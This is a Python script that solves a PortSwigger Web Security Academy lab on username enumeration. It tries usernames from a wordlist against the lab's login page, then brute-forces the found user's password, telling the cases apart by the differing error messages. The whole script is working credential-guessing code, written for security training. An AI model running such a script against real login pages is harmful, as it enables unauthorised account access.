# Lab1 in portswigger: Username enumeration via different responses
# This is a script for guessing the username and password for the login page.
import requests
from termcolor import colored

url = "https://0ab9003b03ada268c0db0ece00620056.web-security-academy.net/login" # Set the url.
cookies = {"session": "d9lEPlY1nd5XxWHQmj5KfCWhiV9wRaf9"} # Change it with your session value.

def guess_username():
    with open("/PATH/users_list.txt","r") as file: # Modify it with the users list path.
        for username in file:
            username = username.strip()
            # print(username)
            data = {"username": username, "password": "password"}
            response = requests.post(url, cookies=cookies, data=data)
            if "Invalid username" in response.text:
                print(colored(f"[!!] Invalid user: {username}","red"))
            else:
                print(colored(f"[+] Valid username is found... ","green"))
                return username
                

def guess_password(username):                
    with open("/PATH/passwords_list.txt","r") as file: # Modify it with the passwords list path.
        for password in file:
            password = password.strip()
            # print(password)
            data = {"username": username, "password": password}
            response = requests.post(url, cookies=cookies, data=data)
            if "Incorrect password" in response.text:
                print(colored(f"[!!] Incorrect password: {password}","red"))
            else:
                print(colored(f"[+] Valid password is found... ","green"))
                return password     

def main():
    username = guess_username()
    password = guess_password(username)  
    print()
    print(colored(f"[+] Username: --> {username}","green"))
    print(colored(f"[+] Password: --> {password}","green"))    

if __name__ == '__main__':
    main()               
          
